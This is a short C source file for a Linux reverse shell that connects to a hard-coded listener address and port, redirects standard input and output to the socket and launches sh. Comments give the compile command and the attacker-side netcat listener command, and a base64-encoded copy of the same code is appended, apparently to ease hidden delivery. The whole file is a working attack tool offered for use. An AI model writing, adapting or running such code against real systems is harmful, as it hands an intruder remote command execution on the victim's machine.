// gcc compile : gcc RevSCWin.c -o RevSCWin.sh
// nc listener on attacker shell (change port to what you changed on the prog file) : nc -lvnp 25565 
// main program : 
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 25565; //port to listen on
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.1.1"); //ip adress of the listener

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execve("sh", argv, NULL);

    return 0;       
}

//also do hug not drugs :)

//Base64 encoded : I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+CiNpbmNsdWRlIDxhcnBhL2luZXQuaD4KCmludCBtYWluKHZvaWQpewogICAgaW50IHBvcnQgPSAyNTU2NTsKICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByZXZzb2NrYWRkcjsKCiAgICBpbnQgc29ja3QgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIDApOwogICAgcmV2c29ja2FkZHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7ICAgICAgIAogICAgcmV2c29ja2FkZHIuc2luX3BvcnQgPSBodG9ucyhwb3J0KTsKICAgIHJldnNvY2thZGRyLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcigiMTkyLjE2OC4xLjEiKTsKCiAgICBjb25uZWN0KHNvY2t0LCAoc3RydWN0IHNvY2thZGRyICopICZyZXZzb2NrYWRkciwgCiAgICBzaXplb2YocmV2c29ja2FkZHIpKTsKICAgIGR1cDIoc29ja3QsIDApOwogICAgZHVwMihzb2NrdCwgMSk7CiAgICBkdXAyKHNvY2t0LCAyKTsKCiAgICBjaGFyICogY29uc3QgYXJndltdID0geyJzaCIsIE5VTEx9OwogICAgZXhlY3ZlKCJzaCIsIGFyZ3YsIE5VTEwpOwoKICAgIHJldHVybiAwOyAgICAgICAKfQ==